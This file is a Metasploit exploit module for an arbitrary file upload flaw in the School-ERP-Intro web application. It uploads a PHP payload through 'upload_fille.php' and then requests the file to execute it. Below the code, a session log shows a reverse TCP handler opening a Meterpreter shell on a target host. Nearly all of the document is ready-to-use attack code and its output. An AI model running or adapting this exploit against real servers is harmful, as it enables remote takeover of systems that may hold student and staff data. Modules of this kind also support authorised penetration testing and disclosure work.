class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'School-ERP-Intro Arbitrary File Upload',
      'Description'    => %q{
         This module exploits a arbitrary file upload issue in 'upload_fille.php'.
      },
      'Author'      => ['MC'],
      'Platform'    => 'php',
      'Arch'        => ARCH_PHP,
      'Targets'     =>
        [
          [ 'School-ERP-Intro.zip / XAMPP', { } ],
        ],
      'References'     =>
        [
          ['URL', 'https://sourceforge.net/projects/school-erp-ultimate/files/']
        ],
      'DisclosureDate' => 'Mar 2 2020',
      'DefaultTarget'  => 0
    )

    register_options(
      [
        OptString.new('PATH', [ true,  "The path to attempt to upload", '/School-ERP-Intro/greatbritain/greatbritain/upload_fille.php']),
      ])
  end

  def exploit

    page = rand_text_alpha_upper(5) + ".php"

    mime = Rex::MIME::Message.new
    mime.add_part(payload.raw, "text/plain", nil, "form-data; name=\"txtdocname\"; filename=\"#{page}\"")
    mime.add_part("Submit", nil, nil, "form-data; name=\"btnsubmit\"")
    form_data = mime.to_s

    print_status "Uploading Payload to #{datastore['PATH']}"
    res = send_request_cgi({
          'uri'     => "#{datastore['PATH']}",
          'method'  => 'POST',
          'ctype'   => "multipart/form-data; boundary=#{mime.bound}",
          'data'    => form_data,
        }, 5)
    
    unless (res and res.code == 200)
      print_error "Failed to upload file!"
      return
    end
    print_status "Attempting to execute Payload"
    res = send_request_cgi({
      'uri'          =>  "/School-ERP-Intro/greatbritain/greatbritain/upload_data/" + page,
      'method'       => 'GET'
    }, 5)
  end

end
__END__
msf5 > use exploit/mc/school_erp_intro 
msf5 exploit(mc/school_erp_intro) > set rhosts 192.168.1.181
rhosts => 192.168.1.181
msf5 exploit(mc/school_erp_intro) > set lport 9898
lport => 9898
msf5 exploit(mc/school_erp_intro) > exploit

[*] Started reverse TCP handler on 192.168.1.1:9898 
[*] Uploading Payload to /School-ERP-Intro/greatbritain/greatbritain/upload_fille.php
[*] Attempting to execute Payload
[*] Sending stage (38288 bytes) to 192.168.1.181
[*] Meterpreter session 1 opened (192.168.1.1:9898 -> 192.168.1.181:50296) at 2020-03-02 08:11:00 -0600

meterpreter > getuid
Server username: priv (0)
meterpreter > 

